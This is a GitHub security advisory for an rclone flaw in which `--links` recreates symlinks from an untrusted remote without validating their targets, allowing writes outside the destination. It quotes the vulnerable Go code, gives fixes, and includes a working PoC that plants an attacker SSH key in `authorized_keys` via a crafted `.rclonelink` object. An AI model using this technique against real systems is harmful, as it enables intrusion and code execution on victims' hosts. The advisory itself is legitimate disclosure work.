# [H] rclone: Unvalidated symlink target in local `--links` — arbitrary file write from an untrusted remote

## Summary
Severity: High
Advisory: GHSA-cf44-9pgv-m4xc
CVE: CVE-2026-54572
CWE: CWE-59
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:H/A:L (CVSS_V3)
Published: 2026-08-05
Source: https://github.com/advisories/GHSA-cf44-9pgv-m4xc
Type: github-advisory

## Affected
- Go: `github.com/rclone/rclone` — affected >=0 <1.74.4

## Details
### Summary
With `-l/--links`, rclone serializes symlinks as `<name>.rclonelink` text objects whose body is the link target. When rclone writes such an object to a local destination, it recreates the symlink with `os.Symlink(<object body>, <dest path>)` and performs NO validation of the target. If the source is attacker-controlled, the attacker sets the body to any absolute or `../` path, so rclone plants a symlink inside the destination that points anywhere on the victim's filesystem. Because a sibling object named `<name>.rclonelink` sorts before `<name>/...`, rclone creates the escaping symlink first and then writes a following object "inside" it; `mkdirAll`/`OpenFile` follow the planted symlink, so the file lands OUTSIDE the destination with attacker-chosen contents. This yields arbitrary file write as the victim user, e.g. overwriting `~/.ssh/authorized_keys`, `~/.bashrc`, or a crontab — i.e. code execution.

### Details
`backend/local/local.go`, `Object.Update()`:
```go
} else {
    out = nopWriterCloser{&symlinkData}          // body of <name>.rclonelink = attacker data
}
...
if o.translatedLink {
    if err == nil {
        if _, err := os.Lstat(o.path); err == nil {
            os.Remove(o.path)
        }
        // Use the contents for the copied object to create a symlink
        err = os.Symlink(symlinkData.String(), o.path)   // <-- target NEVER validated (abs / .. allowed)
    }
}
```
`symlinkData` is the raw body of the source object, fully attacker-controlled when copying from an untrusted remote. There is no check that the target is relative or stays within the destination. The subsequent write path (`mkdirAll()` → `file.MkdirAll`, then `file.OpenFile(..., O_CREATE)`) follows existing symlink components with no `O_NOFOLLOW`, so a file written under the planted symlinked directory escapes the destination.

### PoC
1) Get the official stable binary:
```
curl -fsSLO https://downloads.rclone.org/v1.74.3/rclone-v1.74.3-linux-amd64.zip
unzip -j rclone-v1.74.3-linux-amd64.zip '*/rclone' -d .      # ./rclone -> v1.74.3
```
2) Create an attacker-controlled "remote" (two objects) and a victim layout:
```
mkdir -p evil/pwn dest victimhome/.ssh
printf '%s' "$PWD/victimhome/.ssh" > evil/pwn.rclonelink              # body = abs path OUTSIDE dest
printf 'ssh-ed25519 AAAA_ATTACKER_KEY pwned\n' > evil/pwn/authorized_keys
ls -l victimhome/.ssh                                                 # empty (before)
```
3) Serve the malicious remote (models any untrusted remote — bucket / WebDAV / HTTP share):
```
cd evil && python3 -m http.server 38080 --bind 127.0.0.1
```
4) VICTIM ACTION — back up the untrusted remote preserving symlinks:
```
./rclone copy --links --http-url http://127.0.0.1:38080 :http: ./dest -v
```
5) Observe — a file landed OUTSIDE `./dest`:
```
ls -l dest/pwn                       # dest/pwn -> .../victimhome/.ssh   (symlink escapes dest)
cat victimhome/.ssh/authorized_keys  # ssh-ed25519 AAAA_ATTACKER_KEY pwned   <-- written outside dest
```
`pwn.rclonelink` sorts before `pwn/authorized_keys`, so rclone creates the escaping symlink first and the next write follows it out of the destination. With rclone run as the victim user this overwrites `~/.ssh/authorized_keys`, `~/.bashrc`, or a crontab → code execution.

### Impact
An attacker who controls the contents of any remote a victim syncs with `-l/--links` gains arbitrary file write as the victim user, anywhere that user can write. Overwriting `~/.ssh/authorized_keys`, shell rc files, or cron files yields remote code execution on the victim's host. Even without the write-through step, the destination is silently populated with symlinks pointing anywhere on the local filesystem (confinement break / later read-or-write traversal).

### Remediation
In `Object.Update()` reject symlink targets that are absolute or escape the destination root before calling `os.Symlink` (resolve `filepath.Join(dir, target)` and require it to stay within the configured root, or refuse absolute/`..` targets), and write objects with `O_NOFOLLOW` on the final component plus a no-symlink-in-parent check so a planted symlinked directory is never followed. Add a regression test copying a `.rclonelink` with target `/tmp/...` and a sibling file, asserting nothing is written outside the destination.

## References
- https://github.com/rclone/rclone/security/advisories/GHSA-cf44-9pgv-m4xc
- https://nvd.nist.gov/vuln/detail/CVE-2026-54572
- https://github.com/rclone/rclone/commit/1154afebee986180b489084d38e2a0c578751498
- https://github.com/rclone/rclone/commit/874a804f5289517defdd7de68b2a374837080265
- https://github.com/rclone/rclone
- https://github.com/rclone/rclone/releases/tag/v1.74.4
